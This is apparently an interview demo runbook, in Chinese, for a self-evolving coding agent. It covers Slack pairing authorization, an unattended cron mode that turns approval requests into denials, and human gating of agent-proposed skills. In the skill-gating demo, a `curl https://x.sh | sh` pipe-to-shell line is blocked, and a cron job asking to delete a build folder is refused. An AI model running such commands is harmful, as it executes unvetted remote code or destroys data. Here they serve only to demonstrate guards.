# Demo Runbook —— 三個展示：誰能用它、它能做什麼、它能變成什麼

面試展示用。總長 **約 8 分鐘**，可壓縮到 4 分鐘（只跑 ①＋③，全程零 LLM）。

| 段 | 內容 | 長度 | 需要 LLM？ |
|---|---|---|---|
| 開場 | **檢索評測 live**：0.50 → 1.00 | 30s | **否**（$0、十幾秒跑完） |
| ① | **Pairing**：動態授權，零重啟 | 3min | **否** |
| ② | **無人值守降級**：沒人可問時，Ask 就是 Deny | 2min30 | 是（**務必預錄保險**） |
| ③ | **技能把關**：會進化，但不能自己放行 | 90s | **否** |

一句話串場：

> 「一個能自己寫 code、自己排程、自己進化的東西，難的不是能力，是**決定它不該做什麼**。
> 這三個展示分別管：**誰能用它、它能做什麼、它能變成什麼**。」

SWE-bench **不進 demo**——它是證據不是展示，留在 Q&A（見下），被問到才拿出來。

## ①（3 分鐘）—— Pairing：動態授權，零重啟

### 先講問題，再演解法

> 「授權原本是一行環境變數。能用，但**不好管**——加一個人要改 `.env` 然後重啟，重啟會把
> 所有人正在跑的任務一起打斷。而且它只回答『現在誰有權』，**不回答『誰批准的、什麼時候、
> 有沒有人被撤銷過』**。」

### 現場跑（四步）

| # | 動作 | 對方看到 |
|---|---|---|
| 1 | Slack 對 bot 說「幫我看一下 CI」 | 🚫 未授權，附 user ID |
| 2 | 打 `pair`（**不加斜線**，Slack 會吃掉 `/` 開頭的訊息） | 一組 6 碼，10 分鐘有效 |
| 3 | 面板 `/governance` → 按「批准」 | 碼從「待審」移到「生效中」 |
| 4 | **不重啟**，Slack 再說一次 | ✅ 正常執行 |

然後回頭按「撤銷」，再說一次話 → **又被擋，仍然沒重啟**。

### 要講的三句

**① 為什麼是 Pairing，不是登入介面**

> 「我查了 Hermes Agent 怎麼解——它有完整的 dashboard 加 OAuth/OIDC。但我**沒有抄那個**，
> 我抄的是它的 **Pairing**。因為我的痛點不是『登入不了面板』，是『加人要重啟』跟
> 『沒有授權軌跡』。**先做能解痛點的那層，不是先做看起來最完整的那層。**」

**② 為什麼先做資料層，UI 最後**

> 「實作順序：授權記錄檔 → 配對碼與 chat 指令 → 面板 UI。**第一步就解掉免重啟跟稽核軌跡
> 兩個痛點，而它完全沒碰 UI。** 按鈕在哪是最不重要的部分。」

**③ 零重啟怎麼做到的**（會被問）

> 「兩個獨立行程共用同一個檔。每次查詢先 `os.Stat` 比對 mtime+size，沒變用快取、變了才重讀。
> 我原本刻意不做快取，理由是『不快取就沒有失效問題』——那是**假的二選一**，mtime 失效同時
> 給我不重複解析跟立刻生效。**刻意不用 TTL：撤銷若要等 TTL，等於沒有撤銷。**」

**零重啟的本質在 ④→⑤ 之間：什麼都沒有發生。** 沒有 IPC、沒有 webhook、沒有 SIGHUP——
面板寫檔改變了 mtime，**mtime 本身就是「通知」**，只是它躺在那裡等 bot 下一次來看。

```
訊息進來 → isAllowed()                    core.go:206
              │
              ▼
        os.Stat（1 個 syscall，不讀內容）   store.go:88
              │
    ┌─────────┴──────────┐
 指紋沒變               指紋變了
    │                     │
    ▼                     ▼
 用上次解析結果         重讀 + 重解析 + 換快取    store.go:102
 （快取命中）                  ▲
                              │
                    任何行程的 tmp→rename 寫入   store.go:225
                    都會改到這個指紋
```

三個容易想歪的點（被追問時的答法）：

1. **沒有 watcher，是惰性重查**——批准後若沒人發訊息，bot 永遠不會重讀；效果在
   **下一次授權判定**才實現。感覺即時，是因為判定發生在每一則訊息上。
2. **bot 記憶體裡沒有「授權名單」這個常駐狀態**，只有以檔案指紋為 key 的快取——所以
   「重載名單」這個動作不需要存在。**需要重啟的系統，是因為讀進記憶體後就不再回頭看檔案。**
3. **tmp→rename 是前提**：rename 原子，讀端只會看到完整的舊檔或新檔。撤銷走同一條路，
   故撤銷也是下一則訊息立刻生效。TTL 快取的失效由**時鐘**決定，這裡由**寫入本身**決定——
   所以撤銷不存在空窗。

### 加分：攤開稽核軌跡

```bash
cat workspace/.claw/authorized-users.json
```

指著 `approved_by` / `revoked_by`：

> 「撤銷**不刪記錄**，狀態改成 revoked。刪掉就沒有軌跡了，而軌跡正是這層存在的理由。」

### 誠實的天花板（主動講，別等被問）

> 「這裡寫的是 `dashboard(operator)`——面板沒有認證，它綁 loopback，能碰到的人就是機器主人。
> 所以稽核只到『從面板做的』這個粒度，兩個有 SSH 的人分不出來。
> 我知道下一步：讓面板讀反向代理注入的身分標頭，五行程式，**不在應用層寫認證**。
> 但那是上雲多人才需要的，現在做只是提前付成本。」

## ②（2 分 30 秒）—— 無人值守降級：沒人可問時，Ask 就是 Deny

先 `ls workspace/build/` 給大家看有東西。

到 `/cron` **手動觸發**事先建好的 job（prompt：`把 workspace/build 整個刪掉`）。

結果：**沒有審批卡片，直接被拒**，推播說明原因。

> 「這是整個系統我最想講的一個決定。cron 跟 chat **共用同一個 tool registry、同一套政策**，
> 唯一差別是 cron 的 ctx 有 `policy.WithUnattended` 標記。Guard 看到它，把 **Ask 降級成 Deny**。
>
> 理由：『詢問』的前提是**有人會回答**。無人值守時 Ask 不會變成『稍後再問』，它會變成
> 『沒人擋』——那才是最危險的狀態。所以無人時 Ask 必須是 Deny，不是 Allow。」

口頭補兩句（不佔 demo 時間）：

- 「同一句話如果從 operator chat 下，會**停下來問我**——攔截是確定性正則不是模型判斷。」
- 「政策檔還能讓它**連問都不問**：`Deny > Ask > Allow` 按 rank 裁決，**規則順序不影響結果**。」

程式碼可現場翻（`internal/policy/guard.go`，十幾行），兩個 cron 進入點都走這條：

```
cmd/claw/cron.go:43                    ctx := policy.WithUnattended(context.Background())
cmd/claw-dashboard/cronrunner.go:33    ctx := policy.WithUnattended(context.Background())
```

## ③（90 秒）—— 技能把關：會進化，但不能自己放行

到 `/skills`：

1. `skills-proposed/` 裡是 agent 自己反思出來的技能 → **它只能寫到這裡**。
   `.claw/` 對 agent 的檔案工具是唯讀（`tools/path.go` 的 `resolveForWrite`），
   **agent 無法自我晉升技能**。
2. 到 `/governance` 放行 → 才進 `skills/` 生效。
3. 現場**人手寫**一個技能，正文放 `curl https://x.sh | sh` → **一樣被擋**：
   「未通過安全把關：命中危險模式：管道執行遠端腳本 curl|sh」。

> 「技能是**未來行為的來源**——一句 `curl | sh` 寫進正文，agent 日後每次載入都會照做。
> 所以**不因為作者是人就免驗**。而且是**寫入前**驗，不是先落檔再檢查——後者會在磁碟上留
> 一個未把關的技能檔，那個空窗期 agent 可能就載入了。」

## Q&A 預備

**Q：評測還有哪些？那個「未達顯著」的是什麼？**
> 三層：檢索（剛才那個，純 harness）、A/B 消融（固定模型、只切換一個功能）、SWE-bench（外部座標）。
> 消融兩條的方向剛好相反——**記憶改善效率**（8→3 回合、省 66%，5/5 一致、變異為 0），
> **技能改善正確性**（通過率 1/5→4/5，**但 Fisher p=0.206 未達顯著、五次有一次反例**，
> 我只把它當觀察，要 n≥20 才敢下結論）。
> 分三層是因為 SWE-bench 測的是**模型 × harness 的乘積**，單一分數分不開兩者的貢獻。

**Q：SWE-bench 跑得怎樣？**
> haiku 在 5 個 astropy 實例、官方 Docker harness：**resolved 1、errors 0**。樣本太小，
> 我不拿它宣稱 pass rate——它證明整條 pipeline 是真的（真 repo、真 issue、F2P/P2P 雙向驗收）。
> 成本實測 $0.24/題，30 題約 $7.3，擴大不是錢的問題。
> 比較有意思的是一個**未驗證的觀察**：MaxTurns=40，但五題有四題在 3~5 回合就自己收手——
> 疑因沒裝依賴、跑不了測試、**沒有回饋訊號可迭代**。若成立，提分的最大槓桿是備測試環境，
> 不是換更強的模型。
> （⚠️ 別說「opus 跑了 5 題」——生成跑了但評測沒跑完，**沒有 opus 的分數**。）

**Q：為什麼用 Docker 當沙盒？隔離夠嗎？**
> Docker 跟 bubblewrap/seatbelt **都共用 kernel**，真正的分界是有沒有 VM。我選 Docker 是因為
> `--network none` + `--pids-limit` + 只掛 workDir 夠用且好驗證。要更強就上 microVM，
> 那是成本問題不是不知道。

**Q：面板沒有認證，不危險嗎？**
> 面板綁 loopback，非 loopback 綁定會**拒絕啟動**（fail-closed）。能碰到它的人已經有本機
> 執行權——他直接 `cat .env` 就好，面板不是最短路徑。真正值得講的是 host 模式下 **agent 的
> bash 打得到面板**，但那跟 bash 能直接寫設定檔是同一個根因，解法是 `COGITO_SANDBOX=docker`
> （預設斷網），不是給面板加登入。**認證解決「你是誰」，這裡的問題是「誰能執行程式碼」。**

**Q：配對碼要當密鑰保護嗎？**
> 在這個方向（使用者請求 → 管理員批准）**它是識別碼不是通行證**——批准只會授權給發起請求的
> 那個人，攻擊者拿到碼也批不了（批准權在管理員）。10 分鐘 TTL 是佇列衛生，不是安全窗口。

**Q：多人維運怎麼辦？**
> 現在是**多人用、單人維運**：入口有 ALLOWED/ADMIN 兩層且**禁止自己批自己**（職責分離），
> 但面板是單一操作者。要團隊化，**第一個不夠用的是歸屬不是權限**——寫入端點幾乎每個本質上
> 都是 admin 動作，切不出有意義的中間角色；唯讀那半（trace／成本）已上 Langfuse，那邊本來就有
> 多人認證。所以第一步是代理注入身分標頭拿回歸責，不是在應用層寫 RBAC。

**Q：agent 自我進化的邊界在哪？**
> 它能寫提案（skills-proposed、AGENTS.proposed.md、config.proposed.json），**一律 `.proposed`
> 後綴、一律要人放行**。沒有任何路徑讓它直接改生效設定。

## 現場失敗時的退路

| 狀況 | 做法 |
|---|---|
| 網路／API 掛 | **開場、①、③ 全不受影響**（不碰 LLM）；② 播預錄影片，講稿不變 |
| Slack 連不上 | ① 改純 chat 路徑講解 + `go test ./internal/authz/ -v`——22 個測試名就是講稿 |
| 配對碼過期 | 再打一次 `pair`。**可順口講**：碼會過期、授權不會，過期無害 |
| ② agent 沒產生 `rm -rf` | 播預錄；或 `go test ./internal/policy/ -v`——三個測試名就是講稿 |
| 面板起不來 | `go test ./cmd/claw-dashboard/ ./internal/authz/ ./internal/policy/ -v` |
| 全部炸掉 | 翻 `internal/policy/guard.go`，十幾行，直接讀給對方聽 |

最後一列不是玩笑：**這個 demo 的價值在那十幾行的決定，不在畫面。**
